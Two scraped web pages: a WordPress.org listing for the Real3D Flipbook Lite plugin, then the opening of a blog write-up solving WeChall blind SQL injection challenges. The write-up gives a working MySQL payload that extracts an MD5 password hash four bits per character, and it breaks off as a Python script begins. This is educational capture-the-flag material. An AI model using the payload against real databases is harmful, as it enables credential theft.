=== Content from wordpress.org_e3df9bb9_20250125_173123.html ===


[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Showcase](https://wordpress.org/showcase/)
* [Hosting](https://wordpress.org/hosting/)
* Extend
  + [Themes](https://wordpress.org/themes/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Blocks](https://wordpress.org/blocks/)
  + [Openverse ↗︎](https://openverse.org/)
* Learn
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* Community
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [Events](https://events.wordpress.org/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* About
  + [About WordPress](https://wordpress.org/about/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
* [Get WordPress](https://wordpress.org/download/)

Search in WordPress.org

[Get WordPress](https://wordpress.org/download/)

[WordPress.org](https://wordpress.org/)

[Plugin Directory](https://wordpress.org/plugins/)

Real3D Flipbook Lite – 3D FlipBook, PDF Viewer, PDF Embedder

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Freal3d-flipbook-lite&locale=en_US)

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Freal3d-flipbook-lite&locale=en_US)

Search plugins

![](https://ps.w.org/real3d-flipbook-lite/assets/banner-772x250.jpg?rev=3058655)
![](https://ps.w.org/real3d-flipbook-lite/assets/icon-128x128.gif?rev=3038000)
# Real3D Flipbook Lite – 3D FlipBook, PDF Viewer, PDF Embedder

By [creativeinteractivemedia](http://codecanyon.net/user/creativeinteractivemedia)

[Download](https://downloads.wordpress.org/plugin/real3d-flipbook-lite.4.8.5.zip)

* [Details](https://wordpress.org/plugins/real3d-flipbook-lite/#description)
* [Reviews](https://wordpress.org/plugins/real3d-flipbook-lite/#reviews)
* [Installation](https://wordpress.org/plugins/real3d-flipbook-lite/#installation)
* [Development](https://wordpress.org/plugins/real3d-flipbook-lite/#developers)

[Support](https://wordpress.org/support/plugin/real3d-flipbook-lite/)

## Description

**Real3D Flipbook Lite** is the ultimate **3D Flipbook Plugin for WordPress** that converts your PDFs and images into interactive, realistic 3D flipbooks. Enhance your website’s user experience with lifelike page-turning effects that work seamlessly on all devices and browsers.

### **Why Choose Real3D Flipbook Lite?**

* **Realistic 3D Page Flip Animation**

  + Experience the most realistic page-flipping effect with advanced 3D animations that captivate your audience.
* **Fully Responsive and Mobile-Friendly**

  + Flipbooks adapt perfectly to any screen size—desktops, tablets, or smartphones—ensuring a smooth user experience.
* **Easy Integration with Gutenberg and Shortcodes**

  + Insert flipbooks effortlessly using Gutenberg blocks or shortcodes. No coding skills required.
* **Multiple View Modes**

  + Choose from Lightbox, Swipe, Scroll, and Fullscreen modes to display your flipbooks the way you want.
* **Customizable Design**

  + Personalize your flipbooks with various settings for toolbar, background, colors, and more to match your brand.
* **SEO Optimized**

  + Built with SEO best practices to help your flipbooks rank higher in search results and attract more organic traffic.

### **Live Demo & Documentation**

* **[Live Demo](https://real3dflipbook.com)**
* **[Try Your PDF](https://real3dflipbook.com#try)**
* **[User Manual](https://real3dflipbook.gitbook.io/wp-lite/)**

### **Support**

* For questions or support, **[open a ticket](https://wordpress.org/support/plugin/real3d-flipbook-lite/)**.

### **Key Features**

#### **1. Realistic 3D Flipbooks**

* Bring your content to life with the most realistic 3D page-flipping animations available.

#### **2. Open PDF Links as Flipbooks**

* Automatically convert PDF links into interactive flipbooks that open in a lightbox. **[Watch Video](https://youtu.be/MTFyY84o1Ss)**

#### **3. Easy Migration from Other Plugins**

* Seamlessly convert shortcodes from PDF Embedder, DearFlip, 3D Flipbook, Wonder PDF Embed, and PDF.js Viewer to Real3D Flipbook.

#### **4. Create Flipbooks in 5 Simple Steps**

1. **Add New Flipbook:** Go to Real3D Flipbook > Add New.
2. **Select PDF or Images:** Upload your content.
3. **Publish:** Save your flipbook.
4. **Copy Shortcode:** Grab the generated shortcode.
5. **Embed:** Paste it into any post or page.

* **[Watch Tutorial](https://youtu.be/1ljFRYr0Kh8)**

#### **5. Multiple Display Modes**

* **Lightbox Flipbook:** Open flipbooks in a fullscreen overlay triggered by buttons, links, or images.
* **Embedded Flipbook:** Place flipbooks directly within your posts or pages.

#### **6. Self-Hosted for Speed and Security**

* All files are stored on your server, ensuring fast load times and enhanced security.

#### **7. Customizable Interface**

* Tailor your flipbooks with customizable toolbar buttons, backgrounds, colors, and control settings.

#### **8. Responsive and Touch-Friendly**

* Optimized for touch interactions on mobile devices, providing a seamless experience for all users.

### **Advanced Features in PRO Version**

Upgrade to **[Real3D FlipBook PRO](https://real3dflipbook.com)** to unlock:

* **PDF Hyperlinks:** Interactive links within your PDFs.
* **Text Search and Select:** Enable users to search and select text.
* **Customizable Toolbar:** Add or remove toolbar buttons.
* **Unlimited Pages and File Sizes:** Handle large PDFs with ease.
* **Advanced Customization:** More control over flipbook appearance and behavior.

### **Add-Ons**

* **[PDF Tools Addon](https://real3dflipbook.com/pdf-tools-addon/):** Convert PDFs to images for faster loading and improved security.

### Upgrade to PRO for More Features

Unlock advanced features like PDF hyperlinks, text search, custom toolbar configurations, and much more. Enhance your content presentation with [Real3D FlipBook PRO](https://real3dflipbook.com).

## Screenshots

* [![](https://ps.w.org/real3d-flipbook-lite/assets/screenshot-1.gif?rev=3036997)](https://ps.w.org/real3d-flipbook-lite/assets/screenshot-1.gif?rev=3036997)
* [![](https://ps.w.org/real3d-flipbook-lite/assets/screenshot-2.gif?rev=3036998)](https://ps.w.org/real3d-flipbook-lite/assets/screenshot-2.gif?rev=3036998)
* [![](https://ps.w.org/real3d-flipbook-lite/assets/screenshot-3.gif?rev=3036997)](https://ps.w.org/real3d-flipbook-lite/assets/screenshot-3.gif?rev=3036997)
* [![](https://ps.w.org/real3d-flipbook-lite/assets/screenshot-4.gif?rev=3036997)](https://ps.w.org/real3d-flipbook-lite/assets/screenshot-4.gif?rev=3036997)
* [![](https://ps.w.org/real3d-flipbook-lite/assets/screenshot-5.gif?rev=3036997)](https://ps.w.org/real3d-flipbook-lite/assets/screenshot-5.gif?rev=3036997)

## Blocks

This plugin provides 1 block.

* R Dfb Embed

## Installation

### **Automatic Installation**

1. **Install Plugin:**

   * Navigate to **Plugins > Add New** in your WordPress dashboard.
   * Search for **Real3D Flipbook Lite**.
   * Click **Install Now** and then **Activate**.
2. **Create a Flipbook:**

   * Go to **Real3D Flipbook > Add New**.
   * Upload your **PDF** or **images**.
   * Customize settings if desired.
   * Click **Publish**.
3. **Embed Flipbook:**

   * Copy the generated **shortcode**.
   * Paste it into any **post** or **page** where you want the flipbook to appear.

### **Manual Installation**

1. **Download Plugin:**

   * Download the plugin zip file from the WordPress plugin repository.
2. **Upload to WordPress:**

   * Go to **Plugins > Add New > Upload Plugin**.
   * Choose the downloaded zip file and click **Install Now**.
3. **Activate Plugin:**

   * After installation, click **Activate Plugin**.
4. **Create and Embed Flipbook:**

   * Follow steps under **Automatic Installation** to create and embed your flipbook.

## FAQ

### How do I create a flipbook?

* Navigate to **Real3D Flipbook > Add New**, upload your PDF or images, customize settings, and click **Publish**.

### How do I embed a flipbook in a post or page?

* Copy the **shortcode** from the flipbook list and paste it into your desired post or page.

### Is there a limit to the number of pages or PDF file size?

* No, Real3D Flipbook Lite supports large PDFs with hundreds of pages. It uses smart loading to ensure performance isn’t affected.

### How can I optimize my PDF flipbook for fast loading?

* Optimize your PDFs by:
  + Reducing image resolutions to 150 dpi.
  + Using JPEG compression.
  + Enabling web optimization settings.

### How can I optimize my image flipbook for fast loading?

* Use web-optimized images with a resolution around 2000px in JPG or WebP formats.

## Reviews

![](https://secure.gravatar.com/avatar/c63df3f942c119a31f90172fcadf19e97852065838d329aa3dcfb27b2d637351?s=60&d=retro&r=g)
### [Good plugin but its not free version](https://wordpress.org/support/topic/good-plugin-but-its-not-free-version/)

[oscarminipro](https://profiles.wordpress.org/oscarminipro/ "Posts by oscarminipro")
November 6, 2023
2 replies

Is good plugin

![](https://secure.gravatar.com/avatar/fc29a040754a796607f46a128e6b54e53d1491994ec3326df3ef015c23bb8f37?s=60&d=retro&r=g)
### [Issuu? Forget it! \*This\* is what you need!](https://wordpress.org/support/topic/issuu-forget-it-this-is-what-you-need/)

[Gwyneth Llewelyn](https://profiles.wordpress.org/gwynethllewelyn/ "Posts by Gwyneth Llewelyn")
June 28, 2023
1 reply

Everybody knows about Issuu. It’s a way to publish PDFs and distribute them over the Internet with an astonishingly good look & feel. WordPress can directly embed the Issuu flipbook, and it’s a breeze to use.
We all know that. We also know that Issuu is a paid service. When you have a 150-page catalogue taking 160 MBytes to load… forget it, you cannot afford to host it on Issuu. You have to do it by yourself.
Also, Issuu may not allow all content to be displayed. They have their own reasons for flagging content as inappropriate — in some cases, to view your content, you have to demand that your viewers sign up with Issuu, too (so they can be independently validated, of course). This makes everything much cumbersome.
There are many, many PDF viewers out there. In fact, these days, most people don’t even bother with PDF viewers, because most browsers already have the ability to directly view them — no plugin, no JavaScript, nothing else is required.
“Ah,” you’d say — since you’re reading this review… “but that’s not the same as the cute animations that Issuu allows. It’s bare-bones PDF viewing — boring! Issuu, on the contrary, brings the user the experience of flipping through a book!”
Indeed it does, but what if you have no option but to host the PDFs on your own website?
Enter Real3D Flipbook!
To be perfectly honest: I have the exact same PDF (aye, it’s 150 pages and 160+ MBytes in size) side by side, on Issue and on Real3D Flipbook. I like Real3D Flipbook more. The flipping animation is nicer and more realistic (and you can even get it to play a flipping sound), using advanced WebGL features such as shading and light rendering. And it’s not an embedded iFrame — rather, this plugin directly accesses the browser’s canvas, so it gets access to more powerful tools (or so I guess). And if you’re scared of serving 160 MBytes (or more!) from your own server, don’t worry — Real3D Flipbook will only render pages on demand, as they get requested by the person viewing the PDF. They will not need to retrieve all pages in advance (of course, that also means that if you flip through a big. heavy PDF very quickly, there will be some pages temporarily rendered as blank pages, until Real3D Flipbook ‘catches up’ with the content being served).
Oh, by the way, all the above goodies come as standard on the free version (the one you can get from here). There is a paid version, which you can get from the Envato marketplace. It’s cheap, but it allows much more detailed configuration of all aspects of Real3D Flipbook, have different settings for different PDFs, and so forth. And there is an additional option to store your PDF on their CDN as well, if you’re really concerned about the load on your server.
In other words: if you’re actually recommending to a customer a solution for showing PDFs on their website, and your customer is willing to pay for such a service, then, with Real3D Flipbook, you have basically the same service as Issuu, without their restrictions — and without Issuu’s price. And you get a much cooler flipping animation! (Note that even the free version allows more basic rendering — just using CSS, for instance — which will make your pages much lighter. But that’s your choice!)
I’m aware that this plugin, while heavily recommended, is not faultless. For instance, it’s clear that it doesn’t get updated all that often. Sometimes, this is not necessarily bad — except for security issues, if the plugin already has all the functionality you need, ‘frozen’ in place, so to speak, why bother to update it, just for the sake of saying ‘hey, a new version is out?’ As an amateur plugin developer myself, that’s the path I take as well.
The settings page for the plugin, as well as the online documentation, also suffer from bad spelling mistakes and some confusing organisation overall. It’s clear, from the Envato marketplace, that this plugin stated its life as merely a jQuery-based collection of scripts. Turning it into a plugin (supporting shortcodes and Gutenberg blocks!) required further development, and it’s possible that the ‘adaptation’ of a jQuery-only plugin to work fully integrated into WordPress had its rough edges. Still, one might argue that it could have been done differently, and that both the plugin would benefit from a text revision made by a professional technical writer.
It would also be nice if the developer just updated the information about the version of WordPress this works with. I get all those warnings saying that the plugin has never been tested with the most current version of WordPress. The truth is that it works flawlessly (it was well-designed from the start!), it’s just that the developer didn’t bother to update the version on the plugin configuration files.
Last but not least, even though this is a standalone plugin, and the same applies to the paid version as well, there are extra goodies that you can install separately, buying them directly from Envato. Some of those goodies are extremely useful, while others might not be relevant. Instead of bundling them all together, you just get the features you wish to pay for. That’s certainly a very appealing business model, and one that allows the developer to continue to add functionality to Real3D Flipbook, but with external modules, additional to the ‘core’. In fact, this is the same concept that made WordPress (and, later, WooCommerce) the most-used CMS in the world: start with a bare-bones (but fully functional!) solution first, and let users pick whatever additional functionality they want — adding these in a modular way (some of which will be paid, but the bulk will be free).
Real3D Flipbook adopts the same concept (at a much smaller scale, of course). No wonder it’s so recommended on the popular reviewing sites out there. There might be quite good plugins here and there, many of which free (or at least having an entry-level free version), but none rivals Real3D Flipbook, and most don’t even come close.
Not even Issuu.

![](https://secure.gravatar.com/avatar/2d9adcba1763e83d68c129792fada8e9bbd365dbfa2b33341927f397c9ff099b?s=60&d=retro&r=g)
### [Good plugin with few small quirks.](https://wordpress.org/support/topic/decent-plugin-nonexistent-support/)

[jamespond](https://profiles.wordpress.org/jamespond/ "Posts by jamespond")
May 14, 2020

It’s a good plugin with few small issues that need polishing, one of them being the updates. Unlike all other plugins I purchased, this one requires manually downloading an archive and copying files into relevant folders on the server. I wish this process would be automatic.

![](https://secure.gravatar.com/avatar/b17f7925a299acb11b070557652fe539c997a756d1f4b6b96cd20f0edb158aa5?s=60&d=retro&r=g)
### [left rogue database code after deletion](https://wordpress.org/support/topic/left-rogue-database-code-after-deletion/)

[wasanajones](https://profiles.wordpress.org/wasanajones/ "Posts by wasanajones")
September 13, 2019

crap

![](https://secure.gravatar.com/avatar/114c827eb9b602d8fae27da6715c13ec42adba58ad852acfd64c38c7fc32f2f7?s=60&d=retro&r=g)
### [Best Flipbook WordPress plugin review](https://wordpress.org/support/topic/best-flipbook-wordpress-plugin-review/)

[Transition Slider support](https://profiles.wordpress.org/zsofic1/ "Posts by Transition Slider support")
July 28, 2019

THE BEST Flipbook plugin out there!
It has realistic page flipping and it’s packed with bunch of features.
Highly recommended!
5 stars for this powerful Flipbook, it has it all 🙂

![](https://secure.gravatar.com/avatar/5996f253592d034919de39252f38d4b3ac5e12d104512d079af5574d952ac7fd?s=60&d=retro&r=g)
### [The best PDF flipbook on WordPress.org](https://wordpress.org/support/topic/the-best-pdf-flipbook-on-wordpress-org/)

[Codinga](https://profiles.wordpress.org/dkurecki/ "Posts by Codinga")
July 25, 2019

This plugin is very good, clever and fast! It has all or even more settings from those that may be needed and works great. It’s probably one of the best of WordPress.org. Well done to the developer!

[Read all 6 reviews](https://wordpress.org/support/plugin/real3d-flipbook-lite/reviews/)
## Contributors & Developers

“Real3D Flipbook Lite – 3D FlipBook, PDF Viewer, PDF Embedder” is open source software. The following people have contributed to this plugin.

Contributors

* ![](https://secure.gravatar.com/avatar/59248ff7798eea68a4d8b54ba05fd2486111b5f93888050c537cfac5e19476d8?s=32&d=mm&r=g) [creativeinteractivemedia](https://profiles.wordpress.org/creativeinteractivemedia/)

“Real3D Flipbook Lite – 3D FlipBook, PDF Viewer, PDF Embedder” has been translated into 1 locale. Thank you to [the translators](https://translate.wordpress.org/projects/wp-plugins/real3d-flipbook-lite/contributors) for their contributions.

[Translate “Real3D Flipbook Lite – 3D FlipBook, PDF Viewer, PDF Embedder” into your language.](https://translate.wordpress.org/projects/wp-plugins/real3d-flipbook-lite)

### Interested in development?

[Browse the code](https://plugins.trac.wordpress.org/browser/real3d-flipbook-lite/), check out the [SVN repository](https://plugins.svn.wordpress.org/real3d-flipbook-lite/), or subscribe to the [development log](https://plugins.trac.wordpress.org/log/real3d-flipbook-lite/) by [RSS](https://plugins.trac.wordpress.org/log/real3d-flipbook-lite/?limit=100&mode=stop_on_copy&format=rss).

## Changelog

#### 1.0

* initial release

#### 3.39

* New: more options added under General
* New: WebGL options
* Improvement: better performance
* Improvement: faster page loading time
* Improvement: optimized script loading
* Improvement: smaller script sizes
* Fix : various bug fixes

#### 3.39.1

* Fix: updating from 1.0

#### 3.41

* New: view mode “scroll”
* Fix: view mode “3d” performance

#### 3.42

* New: flipbook mode “lightbox” and “fullscreen” added
* Fix: view mode “scroll” not loading first page if viewer is off screen
* Improvement: disable flipbook when it is off screen

#### 3.50

* Fix: bug with OffscreenCanvas undefined on iOS
* Fix: disable page scroll on mobile when lightbox is active
* Fix: disable page flip if another flipbook is in fullscreen or lightbox
* Improvement: faster page loading in mode “webgl”
* Improvement: faster page loading for PDF flipbooks
* Improvement: performance optimizations

#### 3.53

* Improvement: Added toolbar with Zoom in, Zoom out and Fullscreen options

#### 3.53.1

* New: Help section in Edit flipbook page, with Getting Started video
* New: Open lightbox flipbook with a “lightbox CSS class” – any element with this CSS class will open the lightbox flipbook
* New: Set lightbox CSS class via shortcode parameter “class”
* New: Set PDF URL via shortcode parameter “pdf”
* New: Set lightbox thumbnail URL via shortcode parameter “thumb”

#### 3.54

* Improvement: Updated Getting Started video
* Improvement: Changed default flipbook container size to A4 double page

#### 3.55

* Fix: Creating flipbook from images
* Fix: Flipping pages with arrows in mode “3d” and “2d”

#### 3.56

* New: Thumbnails option in toolbar
* New: Print option in toolbar
* Improvement: Page resolution for PDF flipbook

#### 3.56.1

* New: Help admin page

#### 3.56.2

* New: Toolbar button for enabling / disabling flip sound

#### 3.57

* Fix: Prevent page flip after pinch zoom
* Fix: Prevent double click zoom during page flip

#### 3.58

* Fix: Single page mode with odd number of pages
* Fix: Blurry pages in mode 2D
* Fix: Right to left mode when book has 1 page

#### 3.59

* Fix: Left page not visible on iOS, when view mode is 2d or 3d
* Fix: HTML content not working for PDF flipbook

#### 3.60

* New: Table of Contents from page titles
* New: Table of Contents builder
* New: Share on Facebook, X

#### 3.61

* New: Option to override click on PDF links, all links  will open PDF in Real3D Flipbook lightbox
* New: Option to render shortcodes [pdf-embedder url=”…pdf”], [dflip source=”…pdf”], [wonderplugin\_pdf src=”…pdf”] in Real3D Flipbook

#### 3.61.1

* New: Option to render shortcodes [3d-flip-book pdf=”…pdf”], [3d-flip-book id=”…pdf”], [dflip id=”…pdf”], [pdfjs-viewer url=”…pdf”] in Real3D Flipbook

#### 3.61.2

* Fix: Import flipbooks from JSON

#### 3.62

* New: Download PDF button
* New: Enable / Disable any toolbar button

#### 3.63

* Improvement: Flipbook live preview in admin

#### 3.65

* New: Option to show only first x number of pages
* Fix: Scrollbar on Table of Contents and Thumbnails

#### 3.68

* Improvement: Updated links for addons

#### 3.68.1

* Fix: Conflict with dflip plugin

#### 3.69

* Fix: Override PDF Embedder shortcode and block

#### 3.70

* New: Support for translation with .po .mo files
* New: Added Turkish translation

#### 3.71

* Improvement: Navigation arrows redesign
* Improvement: Thumbnails view redesign

#### 3.72

* Fix: Saving HTML content for flipbook pages
* New: Tooltip for toolbar

#### 3.73

* Fix: Right to left mode in view mode “3d”, “2d”, “simple”

#### 3.73.1

* Fix: Right to left mode in view mode “swipe”

#### 3.74

* New: Resize flipbook container to fit double page flipbook on desktop and single page flipbook on mobile

#### 3.75

* Improvement: Code optimization

#### 3.76

* Improvement: Performance optimization for JPG flipbooks
* Fix: Missing “scroll” option in Mobile > View mode

#### 3.77

* Fix: View mode “swipe” not working

#### 3.79

* New: Tools submenu in toolbar
* Improvement: Share menu redesign
* Improvement: Better flip animation

#### 3.80

* Fix: Flipbook thumbnail overwriting

#### 3.81

* Fix: Flipbook quick edit post deletes flipbook settings

#### 3.82

* New: Container ratio option
* New: Editable Flipbook permalink structure

#### 3.83

* Improvement: Updated to more recent pdf.js
* Fix: Multiple flibpooks on the same page not working
* New: Convert PDF links – Option to convert only PDF links with CSS class
* New: Convert PDF links – Option to convert only PDF links witouts CSS class

#### 4.0

* Improvement: Updated to PDF.js 3.11.174
* Fix: Fullscreen on iOS
* Fix: Double click zoom
* Fix: Flip pages with touch swipe
* Other bug fixes
* Performance improvements

#### 4.1

* Fix: Fullscreen mode flipbook cut off
* Fix: Broken flipbook permalinks

#### 4.1.1

* Improvement: Admin Help page

#### 4.3

* Fix: Lightbox flipbook bug when flipbook is not visible
* Fix: Bulk edit flipbook posts deletes options from flipbook
* Fix: Errors caused by cached scripts
* Fix: Table of Contents from PDF outline
* Fix: PHP 8.3 warning
* Fix: iOS fullscreen shows warning
* Fix: PDF Flipbook rendering bug
* New: Option to enable / disable Current page on mobile
* New: Option to enable / disable Tools menu

#### 4.3.8

* Fix: Bug with creating new flipbooks

#### 4.3.9

* Fix: One page JPG flipbook not working

#### 4.4.1

* Fix: PHP error on flipbook permalink
* Fix: Flipbook not loading in lightbox
* Fix: Single page mode can flip beyond last page

#### 4.4.2

* Fix: JS error on Edit flipbook page

#### 4.5

* Fix: PDF flipbook not loading when RequireJS is used on the page
* Fix: Toggle fullscreen icon does not change on iOS
* Fix: Video does not pause in view mode “scroll” when scrolled page goes outside of view

#### 4.6

* Improvement: Flipbook thumbnail saved as webp
* Improvement: Keep page editor items after replacing PDF
* Improvement: Edit flipbook page performance

#### 4.8

* Fix: Saving flipbooks with large number of pages
* Fix: Menu button Tools not visible in Firefox
* Fix: PDF flipbook with 2 pages
* Improvement: Table of Contents styling
* Fix: Lightbox start page in Right to left mode
* Fix: Last page PDF flipbook

## Meta

* Version **4.8.5**
* Last updated **2 months ago**
* Active installations **7,000+**
* WordPress version **5.0 or higher**
* Tested up to **6.7.1**
* Languages
  See all 2

  Close

  [English (US)](https://wordpress.org/plugins/real3d-flipbook-lite/) and [Turkish](https://tr.wordpress.org/plugins/real3d-flipbook-lite/).

  [Translate into your language](https://translate.wordpress.org/projects/wp-plugins/real3d-flipbook-lite)
* Tags [flipbook](https://wordpress.org/plugins/tags/flipbook/)[pdf embed](https://wordpress.org/plugins/tags/pdf-embed/)[pdf embedder](https://wordpress.org/plugins/tags/pdf-embedder/)[pdf flip book](https://wordpress.org/plugins/tags/pdf-flip-book/)[pdf viewer](https://wordpress.org/plugins/tags/pdf-viewer/)
* [Advanced View](https://wordpress.org/plugins/real3d-flipbook-lite/advanced/)

## Ratings

4 out of 5 stars.

* [3 5-star reviews
  5 stars

  3](https://wordpress.org/support/plugin/real3d-flipbook-lite/reviews/?filter=5)
* [2 4-star reviews
  4 stars

  2](https://wordpress.org/support/plugin/real3d-flipbook-lite/reviews/?filter=4)
* [0 3-star reviews
  3 stars

  0](https://wordpress.org/support/plugin/real3d-flipbook-lite/reviews/?filter=3)
* [0 2-star reviews
  2 stars

  0](https://wordpress.org/support/plugin/real3d-flipbook-lite/reviews/?filter=2)
* [1 1-star review
  1 star

  1](https://wordpress.org/support/plugin/real3d-flipbook-lite/reviews/?filter=1)

[Add my review](https://wordpress.org/support/plugin/real3d-flipbook-lite/reviews/#new-post)

[See all reviews](https://wordpress.org/support/plugin/real3d-flipbook-lite/reviews/)

## Contributors

* ![](https://secure.gravatar.com/avatar/59248ff7798eea68a4d8b54ba05fd2486111b5f93888050c537cfac5e19476d8?s=32&d=mm&r=g) [creativeinteractivemedia](https://profiles.wordpress.org/creativeinteractivemedia/)
## Support

Issues resolved in last two months:

0 out of 2

[View support forum](https://wordpress.org/support/plugin/real3d-flipbook-lite/)

## Donate

Would you like to support the advancement of this plugin?

[Donate to this plugin](https://codecanyon.net/item/real3d-flipbook-wordpress-plugin/6942587)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Privacy](https://wordpress.org/about/privacy/)

* [Showcase](https://wordpress.org/showcase/)
* [Themes](https://wordpress.org/themes/)
* [Plugins](https://wordpress.org/plugins/)
* [Patterns](https://wordpress.org/patterns/)

* [Learn](https://learn.wordpress.org/)
* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [WordPress.tv ↗](https://wordpress.tv/)

* [Get Involved](https://make.wordpress.org/)
* [Events](https://events.wordpress.org/)
* [Donate ↗](https://wordpressfoundation.org/donate/)
* [Five for the Future](https://wordpress.org/five-for-the-future/)

* [WordPress.com ↗](https://wordpress.com/?ref=wporg-footer)
* [Matt ↗](https://ma.tt/)
* [bbPress ↗](https://bbpress.org/)
* [BuddyPress ↗](https://buddypress.org/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our X (formerly Twitter) account](https://www.x.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)
* [Visit our YouTube channel](https://www.youtube.com/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from mukarramkhalid.com_56f17424_20250126_103745.html ===

[# Mukarram Khalid](/ "Mukarram Khalid")

[About](/about "About")
[Contact](/contact "Contact")

* [About](/about "Mukarram Khalid About")
* [Contact](/contact "Mukarram Khalid Contact")

# Blinded by the Light

Mukarram Khalid • February 6, 2016

[python](/category/python "View posts in python")
[sqli](/category/sqli "View posts in sqli")
> Every human being has a basic instinct: to help each other out. If a hiker gets lost in the mountains, people will coordinate a search. If a train crashes, people will line up to give blood. If an earthquake levels a city, people all over the world will send emergency supplies. This is so fundamentally human that it's found in every culture without exception. Yes, there are a\*\*holes who just don't care, but they're massively outnumbered by the people who do. – [The Martian](https://www.imdb.com/title/tt3659388/)

Few days ago, a friend asked me to solve two SQL Injection challenges on WeChall. At first, I thought this would be some regular SQL injection but I was wrong. Actually, these were quite good with some tricky rules making a great case scenario. So, I've decided to do a write-up and blow some dust off my blog.

**Challenge 1 – Blinded by the Light**

* The mission is to extract an MD5 password hash out of a database.
* The limit for this blind SQL injection is 128 queries max.
* The source code of the vulnerable script is given [here](http://www.wechall.net/challenge/blind_light/index.php?highlight=christmas) and we are allowed to execute a [reset](http://www.wechall.net/challenge/blind_lighter/index.php?reset=me).

**Challenge 2 – Blinded by the Lighter**

* This challenge is a sequel to the "Blinded by the light" challenge.
* Again the mission is to extract an MD5 password hash out of the database.
* This time, the limit for this blind SQL injection is 33 queries max.
* Also we have to accomplish this task 3 times consecutively and under 27 minutes.
* The source code of the vulnerable script is given [here](http://www.wechall.net/challenge/blind_lighter/index.php?highlight=christmas) and we can execute a [reset](http://www.wechall.net/challenge/blind_lighter/index.php?reset=me).

Now if you guys want to try these challenges all by your self, you should stop right **HERE**. Or **HERE**. I see you're not stopping. So let's get started.

## Challenge 1 – Blinded by the Light

In Blind SQL injection, we don't get the output of our queries directly on the page. We observe the page response to extract the data and this can be a real pain sometimes. We have to ask the database a series of true or false questions and determine the answers based on the page response. Keeping that in mind, extracting 32 characters using maximum 128 queries, makes it a lot more difficult than I thought.

> So in the face of overwhelming odds, I'm left with only one option. I'm gonna have to science the sh\*t out of this. – [The Martian](https://www.imdb.com/title/tt3659388/)

Let's break it down a little. We need to extract an MD5 password hash.

| Length of MD5 Hash | : 32 Characters |
| --- | --- |
| Max Queries allowed | : 128 |
| Queries per Character | : 128/32 = 4 |

So, we have exactly 4 queries to extract one character. Apparently, this looks impossible. But then the fact that we need to extract an MD5 hash, shows some light in the darkness.

> MD5 message-digest algorithm is a widely used cryptographic hash function producing a 128-bit (16-byte) hash value, typically expressed in text format as a 32 digit Hexadecimal Number. – [Wikipedia](https://en.wikipedia.org/wiki/MD5)

Now we know that we don't need to check every possible printable character because hexadecimals have a limited charset of 16 characters i.e. `0123456789abcdef`. An ASCII character can be represented using 8 bits and if I consider `1` as `true` and `0` as `false`, I still need `8` queries to extract one single character of this MD5 hash. But again, there's something great about these hexadecimals, their first `4` bits are always `0` so we need to extract only last `4` bits.

> It can't be our alphabet. 26 characters plus a question card into 360 gives us 13 degrees of arc. That's way too narrow. I'd never know what the camera was pointing at … … Hexadecimals! Hexadecimals to the rescue. – [The Martian](https://www.imdb.com/title/tt3659388/)

| **ASCII Character** | **First Four Bits** | **Last 4 Bits** |
| --- | --- | --- |
| **0** | 0000 | 0000 |
| **1** | 0000 | 0001 |
| **2** | 0000 | 0010 |
| **3** | 0000 | 0011 |
| **4** | 0000 | 0100 |
| **5** | 0000 | 0101 |
| **6** | 0000 | 0110 |
| **7** | 0000 | 0111 |
| **8** | 0000 | 1000 |
| **9** | 0000 | 1001 |
| **a** | 0000 | 1010 |
| **b** | 0000 | 1011 |
| **c** | 0000 | 1100 |
| **d** | 0000 | 1101 |
| **e** | 0000 | 1110 |
| **f** | 0000 | 1111 |

Now all I have to do is to come up with a MySQL payload to convert each character of the MD5 hash to binary and then extract the last 4 bits (0s: FALSE or 1s: TRUE) one by one. So, that makes it 4 (bits) x 32 (characters in MD5) = 128 (queries). Here's my final payload.

```
or substr(
  lpad(
    conv(
      substr(password, x, 1),
      16,
      2
    ),
    4,
    '0'
  ),
  y,
  1
) -- -

```

This payload will be executed inside two nested loops. The outer loop will iterate `32` times changing the `x` in this payload from `1` to `32`. This loop represents the length of the MD5 hash. The inner loop will iterate `4` times for each character to extract `4` bits one by one changing `y` in this payload from `1` to `4`. The `conv()` function in this payload converts a number or a character from one base to another. So, `Conv('a', 16, 2)` will convert `a` from `base 16` (Hexadecimal) to `base 2` (Binary). Another issue here is that MySQL tends to ignore the leading zeros returned by the `Conv()`. So, `Lpad('a', 4, '0')` makes sure that we have exactly `4` bits. For example, character `5` will be returned as `101` by `Conv()`, which may create problems because our inner loop is looking for `4` bits and not `3`. So `Lpad('101', 4, '0')` will add a leading zero to this value and make it `0101` again. The challenge page returns `true` with the following message.

![True Response](../assets/images/blog/posts/solution-blinded-by-the-light/blinded1.png)

And this is the `false` response.

![False Response](../assets/images/blog/posts/solution-blinded-by-the-light/blinded2.png)

Let's code.

```
#
# [Wecall.net] Blinded by the Light
# Solution by MakMan
# //mukarramkhalid.com/solution-blinded-by-the-light/
